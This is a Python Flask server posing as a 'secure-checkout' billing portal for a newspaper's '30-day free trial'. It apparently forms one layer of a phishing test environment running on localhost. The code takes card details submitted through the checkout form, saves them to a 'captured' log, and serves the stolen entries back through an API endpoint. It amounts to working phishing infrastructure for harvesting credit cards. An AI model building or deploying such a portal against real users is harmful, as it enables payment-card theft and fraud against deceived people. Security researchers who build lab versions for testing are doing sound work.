"""
Herald Billing Portal — 'secure-checkout.nyherald.com' (port 8041)
Layer 3: Credit card capture for '30-day free trial'
"""

import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template, redirect

app = Flask(__name__)

CAPTURED_LOG = os.path.join(os.path.dirname(__file__), "captured.json")
NEWS_PORT = 8040


def log_captured(data: dict):
    records = []
    if os.path.exists(CAPTURED_LOG):
        try:
            with open(CAPTURED_LOG, "r") as f:
                records = json.load(f)
        except Exception:
            records = []
    data["timestamp"] = datetime.utcnow().isoformat() + "Z"
    data["server"] = "billing_portal"
    records.append(data)
    with open(CAPTURED_LOG, "w") as f:
        json.dump(records, f, indent=2)


@app.route("/")
def index():
    return render_template("checkout.html", news_port=NEWS_PORT)


@app.route("/api/captured", methods=["POST"])
def captured():
    data = request.get_json(force=True, silent=True) or {}
    log_captured(data)
    return jsonify({"status": "ok"})


@app.route("/api/captured", methods=["GET"])
def get_captured():
    records = []
    if os.path.exists(CAPTURED_LOG):
        try:
            with open(CAPTURED_LOG, "r") as f:
                records = json.load(f)
        except Exception:
            records = []
    return jsonify({"entries": records})


@app.route("/api/clear", methods=["GET", "POST"])
def clear_captured():
    with open(CAPTURED_LOG, "w") as f:
        json.dump([], f)
    return jsonify({"status": "ok"})


@app.route("/api/submit-billing", methods=["POST"])
def submit_billing():
    data = request.get_json(force=True, silent=True) or {}
    log_captured({
        "layer": "layer3_billing_credit_card",
        "fields": data,
    })
    return jsonify({"status": "ok", "redirect": f"http://localhost:{NEWS_PORT}/billing-return"})


if __name__ == "__main__":
    app.run(port=8041, debug=False)
